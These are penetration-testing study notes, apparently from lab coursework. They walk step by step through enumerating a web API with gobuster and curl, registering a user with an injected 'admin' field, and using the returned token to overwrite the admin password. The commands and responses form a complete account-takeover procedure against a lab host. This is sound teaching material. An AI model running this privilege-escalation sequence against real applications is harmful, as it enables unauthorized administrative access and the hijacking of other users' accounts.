In many cases, our penetration test target is an internally-built, closed-source web application that is shipped with a number of _Application Programming Interfaces_ (API).
These APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application.

\*REST - _Representational State Transfer_
	Specific type of API used for authentication and a variety of other purposes.


- API paths are often followed by a version number:
	```html
	/api_name/v1
	```
- API names are quite descriptive about the feature or data it uses to operate
- Navigating to /ui can show the API's documentation
- Can use GoBuster to brute force API endpoints using a fuzzing pattern:
```bash
cat > pattern
	{GOBUSTER}/V1
	{GOBUSTER}/V2
	#Ctrl D
```
	In this example, we are using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number.

Then brute force
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

	2 interesting entries:  /books/v1 and users/v1.

Can use [curl](OS%20Commands.md#curl) to inspect
```bash
curl -i http://192.168.50.16:5002/users/v1
	HTTP/1.0 200 OK
	Content-Type: application/json
	Content-Length: 241

	{
	  "users": [
	    {
	      "email": "mail1@mail.com",
	      "username": "name1"
	    },
	    {
	      "email": "mail2@mail.com",
	      "username": "name2"
	    },
	    {
	      "email": "admin@mail.com",
	      "username": "admin"            <--- note
	    }
	  ]
	}
 ```

Can then use a smaller wordlist to brute force the admin user:
```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
	...

	/password             (Status: 405) [Size: 142]    <--- note
```

Again using curl:
```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
	HTTP/1.0 405 METHOD NOT ALLOWED
	Content-Type: application/problem+json
	Content-Length: 142
	Server: Werkzeug/1.0.1 Python/3.7.13
	Date: Wed, 06 Apr 2022 10:58:51 GMT
	
	{
	  "detail": "The method is not allowed for the requested URL.",
	  "status": 405,
	  "title": "Method Not Allowed",      <--- note
	  "type": "about:blank"
	}
```
	Notice the 405 NOT ALLOWED response.  Likely, curl's default GET needs to be changed to a POST or PUT


IF this specific API permits POST and/ or PUT methods, we could override the user creds (in this case, admin's pw).
First, verify whether or not the overwritten creds are accepted...

Check if the *login* method is supported by extending the base URL:
```bash
curl -i http://192.168.50.16:5002/users/v1/login
	HTTP/1.0 404 NOT FOUND
	Content-Type: application/json
	Content-Length: 48
	Server: Werkzeug/1.0.1 Python/3.7.13
	Date: Wed, 06 Apr 2022 12:04:30 GMT
	
	{ "status": "fail", "message": "User not found"}    <--- note
```
	Notice how the 404 refers to the User not being found.


So, the status message is, ultimately, a clear sign that the API itself exists (& likely the login as well)
Need to find a proper way to interact with it.

Can attempt a login with the 'admin' username and a dummy password to test whether our strategy makes sense.
- Convert the GET request into a POST
- Provide payload in the required JSON format (via **-d** data switch)
- Specify "json" as the "Content-Type" (via **-H** header switch)
```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

	{ "status": "fail", "message": "Password is not correct for the given username."}
```

This specific authentication failure error means the API parameters are wrong, but correctly formed.
As we don't know the admin's password, we can try to see if **registering** a new user would work instead
- Provides a different attack surface.
```bash
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

	{ "status": "fail", "message": "'email' is a required property"}
```

Status message shows that:
- API has a Register method we can interact with
- Our parameters are correctly formed though lacking an 'email' property
- We can potentially determine if there's also an 'admin' property we can abuse.

Let's add an 'admin' key attached to a 'True' value to see if we can now grant our new user admin rights as well:
```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

	{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```


Status message doesn't error out and tells us we're successful in registering a new user with admin rights.
Now, let's attempt to login with our new creds using the 'login' API we discovered working earlier:
```bash
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

	{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```

Success
- Not only were we able to correctly login, we also retrieved a JWT auth token!
- We should use this token to change the admin user's password
	- Force a POST request that targets that password API discovered earlier
```bash
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

	{
	  "detail": "The method is not allowed for the requested URL.",
	  "status": 405,
	  "title": "Method Not Allowed",
	  "type": "about:blank"
	}
```


Again, another 405 Method Not Allowed.
Try PUT (used to replace a value rather than create one) instead:
```bash
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```


No error message mentioned, so assume no error's been thrown.
Test by logging in as 'admin' with the newly-changed pw:
```bash
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

	{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

Proof of logical privilege escalation bug present in the registration API.
- Happens.  Often due to lack of testing and secure coding best practices.
